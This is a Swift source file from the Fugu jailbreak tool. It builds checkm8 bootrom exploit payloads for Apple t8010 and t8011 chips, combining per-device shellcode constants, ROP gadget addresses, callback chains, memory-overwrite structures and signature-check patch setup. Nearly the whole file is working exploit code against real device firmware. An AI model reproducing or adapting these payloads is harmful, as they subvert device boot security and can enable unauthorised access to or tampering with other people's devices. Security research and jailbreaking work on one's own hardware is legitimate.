//
//  DeviceConfig.swift
//  Fugu
//
//  Created by Linus Henze on 13.10.19.
//  Copyright © 2019/2020 Linus Henze. All rights reserved.
//

import Foundation

struct PwnUSBDeviceConfig {
    // Constants required for pwning
    let version: String
    let largeLeak: Bool
    let leak: Int
    let overwrite: Data
    let overwriteOffset: Int
    let hole: Int
    
    // Exploit payload
    let payload: Data
    
    // Constants required for other purposes
    let dfuUploadBase: UInt64
    
    // Patches for rmsigchks
    let rmsigchksPatches: [UInt64: [UInt8]]
    
    // Patches for iStrap
    let iStrapPatches: [UInt64: [UInt8]]
    let iStrapDisableDFUFunc: UInt64
}

fileprivate func asm_arm64_x7_trampoline(dest: UInt64) -> Data {
    return struct_pack("<2Q", 0xd61f00e058000047 as UInt64, dest)
}

fileprivate func asm_arm64_branch(src: UInt32, dest: UInt32) -> Data {
    var value: UInt32 = 0
    
    if src > dest {
        value = 0x18000000 - (src - dest) / 4
    } else {
        value = 0x14000000 + (dest - src) / 4
    }
    
    return struct_pack("<I", value)
}

func loadResource(name: String) -> Data {
    var url: URL! = Bundle.main.executableURL?.deletingLastPathComponent()
    if url == nil {
        url = URL(fileURLWithPath: FileManager.default.currentDirectoryPath)
    }
    
    guard let payload = try? Data(contentsOf: url.appendingPathComponent(name)) else {
        fail("loadResource: Couldn't find resource \(name)!")
    }
    
    return payload
}

func loadShellcode64(name: String, constants: [UInt64]) -> Data {
    let size = 8
    
    let payload = loadResource(name: "/shellcode/\(name).bin")
    
    let placeholders_offset = payload.count - size * constants.count
    for i in 0..<constants.count {
        let offset = placeholders_offset + size * i
        let value_data = payload.advanced(by: offset).prefix(size)
        if value_data.getGeneric(type: UInt64.self).littleEndian != 0xBAD00001 + i {
            fail("loadShellcode64: Shellcode placeholders are wrong!")
        }
    }
    
    var constants_data = Data()
    for i in 0..<constants.count {
        constants_data.append(struct_pack("<Q", constants[i]))
    }
    
    return payload.prefix(placeholders_offset) + constants_data
}

fileprivate func usb_rop_callbacks(address: UInt64, func_gadget: UInt64, callbacks: [(UInt64, UInt64)]) -> Data {
    var address = address
    var data = Data()
    
    var i = 0
    while i < callbacks.count {
        var block1 = Data()
        var block2 = Data()
        for j in 0..<5 {
            address += 0x10
            
            if j == 4 {
                address += 0x50
            }
            
            if i + j < callbacks.count - 1 {
                block1 += struct_pack("<2Q", func_gadget, address)
                block2 += struct_pack("<2Q", callbacks[i+j].1, callbacks[i+j].0)
            } else if i + j == callbacks.count - 1 {
                block1 += struct_pack("<2Q", func_gadget, 0 as UInt64)
                block2 += struct_pack("<2Q", callbacks[i+j].1, callbacks[i+j].0)
            } else {
                block1 += struct_pack("<2Q", 0 as UInt64, 0 as UInt64)
            }
        }
        
        data += block1 + block2
        
        i += 5
    }
    
    return data
}

fileprivate func getDevicePayload(device: Int) -> Data {
    let PAYLOAD_OFFSET_ARM64: UInt64 = 384
    let PAYLOAD_SIZE_ARM64:   UInt64 = 576
    
    switch device {
    case 0x8960:
        let constants_usb_s5l8960x = [
            0x180380000,        // 1 - LOAD_ADDRESS
            0x6578656365786563, // 2 - EXEC_MAGIC
            0x646F6E65646F6E65, // 3 - DONE_MAGIC
            0x6D656D636D656D63, // 4 - MEMC_MAGIC
            0x6D656D736D656D73, // 5 - MEMS_MAGIC
            0x10000CC78,        // 6 - USB_CORE_DO_IO
            ] as [UInt64]
        
        let constants_checkm8_s5l8960x = [
            0x180086B58,          // 1 - gUSBDescriptors
            0x180086CDC,          // 2 - gUSBSerialNumber
            0x10000BFEC,          // 3 - usb_create_string_descriptor
            0x180080562,          // 4 - gUSBSRNMStringDescriptor
            0x18037FC00,          // 5 - PAYLOAD_DEST
            PAYLOAD_OFFSET_ARM64, // 6 - PAYLOAD_OFFSET
            PAYLOAD_SIZE_ARM64,   // 7 - PAYLOAD_SIZE
            0x180086C70,          // 8 - PAYLOAD_PTR
            ] as [UInt64]
        
        let s5l8960x_handler = asm_arm64_x7_trampoline(dest: 0x10000CFB4) + asm_arm64_branch(src: 0x10, dest: 0x0) + loadShellcode64(name: "usb_0xA1_2_arm64", constants: constants_usb_s5l8960x).advanced(by: 4)
        let s5l8960x_shellcode = loadShellcode64(name: "checkm8_arm64", constants: constants_checkm8_s5l8960x)
        require(s5l8960x_shellcode.count <= PAYLOAD_OFFSET_ARM64)
        require(s5l8960x_handler.count <= PAYLOAD_SIZE_ARM64)
        
        let s5l8960_payload = s5l8960x_shellcode + Data(repeating: 0, count: Int(PAYLOAD_OFFSET_ARM64 - UInt64(s5l8960x_shellcode.count))) + s5l8960x_handler
        
        return s5l8960_payload
        
    case 0x8010:
        let constants_usb_t8010 = [
            0x1800B0000,        // 1 - LOAD_ADDRESS
            0x6578656365786563, // 2 - EXEC_MAGIC
            0x646F6E65646F6E65, // 3 - DONE_MAGIC
            0x6D656D636D656D63, // 4 - MEMC_MAGIC
            0x6D656D736D656D73, // 5 - MEMS_MAGIC
            0x10000DC98,        // 6 - USB_CORE_DO_IO
        ] as [UInt64]
        
        let constants_checkm8_t8010 = [
            0x180088A30,          // 1 - gUSBDescriptors
            0x180083CF8,          // 2 - gUSBSerialNumber
            0x10000D150,          // 3 - usb_create_string_descriptor
            0x1800805DA,          // 4 - gUSBSRNMStringDescriptor
            0x1800AFC00,          // 5 - PAYLOAD_DEST
            PAYLOAD_OFFSET_ARM64, // 6 - PAYLOAD_OFFSET
            PAYLOAD_SIZE_ARM64,   // 7 - PAYLOAD_SIZE
            0x180088B48,          // 8 - PAYLOAD_PTR
        ] as [UInt64]
        
        let t8010_func_gadget:              UInt64 = 0x10000CC4C
        let t8010_enter_critical_section:   UInt64 = 0x10000A4B8
        let t8010_exit_critical_section:    UInt64 = 0x10000A514
        let t8010_dc_civac:                 UInt64 = 0x10000046C
        let t8010_write_ttbr0:              UInt64 = 0x1000003E4
        let t8010_tlbi:                     UInt64 = 0x100000434
        let t8010_dmb:                      UInt64 = 0x100000478
        let t8010_handle_interface_request: UInt64 = 0x10000DFB8
        let t8010_callbacks = [
            (t8010_dc_civac, 0x1800B0600) as (UInt64, UInt64),
            (t8010_dmb, 0) as (UInt64, UInt64),
            (t8010_enter_critical_section, 0) as (UInt64, UInt64),
            (t8010_write_ttbr0, 0x1800B0000) as (UInt64, UInt64),
            (t8010_tlbi, 0) as (UInt64, UInt64),
            (0x1820B0610, 0) as (UInt64, UInt64),
            (t8010_write_ttbr0, 0x1800A0000) as (UInt64, UInt64),
            (t8010_tlbi, 0) as (UInt64, UInt64),
            (t8010_exit_critical_section, 0) as (UInt64, UInt64),
            (0x1800B0000, 0) as (UInt64, UInt64),
        ] as [(UInt64, UInt64)]
        
        let t8010_handler = asm_arm64_x7_trampoline(dest: t8010_handle_interface_request) + asm_arm64_branch(src: 0x10, dest: 0x0) + loadShellcode64(name: "usb_0xA1_2_arm64", constants: constants_usb_t8010).advanced(by: 4)
        var t8010_shellcode = loadShellcode64(name: "checkm8_arm64", constants: constants_checkm8_t8010)
        require(t8010_shellcode.count <= PAYLOAD_OFFSET_ARM64)
        require(t8010_handler.count <= PAYLOAD_SIZE_ARM64)
        t8010_shellcode = t8010_shellcode + Data(repeating: 0, count: Int(PAYLOAD_OFFSET_ARM64 - UInt64(t8010_shellcode.count))) + t8010_handler
        require(t8010_shellcode.count <= 0x400)
        
        return struct_pack("<1024sQ504x2Q496s32x", t8010_shellcode, 0x1000006A5 as UInt64, 0x60000180000625 as UInt64, 0x1800006A5 as UInt64, loadShellcode64(name: "t8010_t8011_disable_wxn_arm64", constants: [])) + usb_rop_callbacks(address: 0x1800B0800, func_gadget: t8010_func_gadget, callbacks: t8010_callbacks)
        
    case 0x8011:
        let constants_usb_t8011 = [
            0x1800B0000,        // 1 - LOAD_ADDRESS
            0x6578656365786563, // 2 - EXEC_MAGIC
            0x646F6E65646F6E65, // 3 - DONE_MAGIC
            0x6D656D636D656D63, // 4 - MEMC_MAGIC
            0x6D656D736D656D73, // 5 - MEMS_MAGIC
            0x10000DD64,        // 6 - USB_CORE_DO_IO
        ] as [UInt64]
        
        let constants_checkm8_t8011 = [
            0x180088948,          // 1 - gUSBDescriptors
            0x180083D28,          // 2 - gUSBSerialNumber
            0x10000D234,          // 3 - usb_create_string_descriptor
            0x18008062A,          // 4 - gUSBSRNMStringDescriptor
            0x1800AFC00,          // 5 - PAYLOAD_DEST
            PAYLOAD_OFFSET_ARM64, // 6 - PAYLOAD_OFFSET
            PAYLOAD_SIZE_ARM64,   // 7 - PAYLOAD_SIZE
            0x180088A58,          // 8 - PAYLOAD_PTR
        ] as [UInt64]
        
        let t8011_func_gadget:              UInt64 = 0x10000CCEC
        let t8011_dc_civac:                 UInt64 = 0x10000047C
        let t8011_write_ttbr0:              UInt64 = 0x1000003F4
        let t8011_tlbi:                     UInt64 = 0x100000444
        let t8011_dmb:                      UInt64 = 0x100000488
        let t8011_handle_interface_request: UInt64 = 0x10000E08C
        let t8011_callbacks = [
            (t8011_dc_civac, 0x1800B0600) as (UInt64, UInt64),
            (t8011_dc_civac, 0x1800B0000) as (UInt64, UInt64),
            (t8011_dmb, 0) as (UInt64, UInt64),
            (t8011_write_ttbr0, 0x1800B0000) as (UInt64, UInt64),
            (t8011_tlbi, 0) as (UInt64, UInt64),
            (0x1820B0610, 0) as (UInt64, UInt64),
            (t8011_write_ttbr0, 0x1800A0000) as (UInt64, UInt64),
            (t8011_tlbi, 0) as (UInt64, UInt64),
            (0x1800B0000, 0) as (UInt64, UInt64),
        ] as [(UInt64, UInt64)]
        
        let t8011_handler = asm_arm64_x7_trampoline(dest: t8011_handle_interface_request) + asm_arm64_branch(src: 0x10, dest: 0x0) + loadShellcode64(name: "usb_0xA1_2_arm64", constants: constants_usb_t8011).advanced(by: 4)
        var t8011_shellcode = loadShellcode64(name: "checkm8_arm64", constants: constants_checkm8_t8011)
        require(t8011_shellcode.count <= PAYLOAD_OFFSET_ARM64)
        require(t8011_handler.count <= PAYLOAD_SIZE_ARM64)
        t8011_shellcode = t8011_shellcode + Data(repeating: 0, count: Int(PAYLOAD_OFFSET_ARM64 - UInt64(t8011_shellcode.count))) + t8011_handler
        require(t8011_shellcode.count <= 0x400)
        
        return struct_pack("<1024sQ504x2Q496s32x", t8011_shellcode, 0x1000006A5 as UInt64, 0x60000180000625 as UInt64, 0x1800006A5 as UInt64, loadShellcode64(name: "t8010_t8011_disable_wxn_arm64", constants: [])) + usb_rop_callbacks(address: 0x1800B0800, func_gadget: t8011_func_gadget, callbacks: t8011_callbacks)
        
    default:
        fail("Payload generation not implemented for device!")
    }
}

fileprivate func getDeviceConfigs() -> [PwnUSBDeviceConfig] {
    let t8010_nop_gadget: UInt64 = 0x10000CC6C
    let t8011_nop_gadget: UInt64 = 0x10000CD0C
    
    // s5l8960 is not supported
    /*let s5l8960_overwrite = struct_pack("<32xQ8x", 0x180380000 as UInt64)
    let s5l8960_payload = getDevicePayload(device: 0x8960)
    let s5l8960_rmsigchks = rmsigchks_patchesFor(device: 0x8960)
    let s5l8960_iStrap = iStrap_patchesFor(device: 0x8960)*/
    
    let t8010_overwrite = struct_pack("<32x2Q", t8010_nop_gadget, 0x1800B0800 as UInt64)
    let t8010_payload = getDevicePayload(device: 0x8010)
    let t8010_rmsigchks = rmsigchks_patchesFor(device: 0x8010)
    let t8010_iStrap = iStrap_patchesFor(device: 0x8010)
    
    let t8011_overwrite = struct_pack("<32x2Q", t8011_nop_gadget, 0x1800B0800 as UInt64)
    let t8011_payload = getDevicePayload(device: 0x8011)
    let t8011_rmsigchks = rmsigchks_patchesFor(device: 0x8011)
    let t8011_iStrap = iStrap_patchesFor(device: 0x8011)
    
    return [
        // s5l8960 - NOT SUPPORTED
        //PwnUSBDeviceConfig(version: "iBoot-1704.10", largeLeak: true, leak: 7936, overwrite: s5l8960_overwrite, overwriteOffset: 0x5C0, hole: 0, payload: s5l8960_payload, dfuUploadBase: 0x180380000, rmsigchksPatches: s5l8960_rmsigchks, iStrapPatches: s5l8960_iStrap, iStrapDisableDFUFunc: 0x100006618),
        
        // t8010
        PwnUSBDeviceConfig(version: "iBoot-2696.0.0.1.33", largeLeak: false, leak: 1, overwrite: t8010_overwrite, overwriteOffset: 0x5C0, hole: 5, payload: t8010_payload, dfuUploadBase: 0x1800B0000, rmsigchksPatches: t8010_rmsigchks, iStrapPatches: t8010_iStrap, iStrapDisableDFUFunc: 0x0),
        
        // t8011
        PwnUSBDeviceConfig(version: "iBoot-3135.0.0.2.3", largeLeak: false, leak: 1, overwrite: t8011_overwrite, overwriteOffset: 0x540, hole: 6, payload: t8011_payload, dfuUploadBase: 0x1800B0000, rmsigchksPatches: t8011_rmsigchks, iStrapPatches: t8011_iStrap, iStrapDisableDFUFunc: 0x0)
    ]
}

func configForDevice<Implementation: USBDeviceImplementation>(_ device: SimpleUSB<Implementation>) throws -> PwnUSBDeviceConfig {
    for config in getDeviceConfigs() {
        if let serialNumber = device.serialNumber {
            if serialNumber.contains("SRTG:[\(config.version)]") {
                return config
            }
        }
    }
    
    throw PwnException(message: "Device not supported!")
}
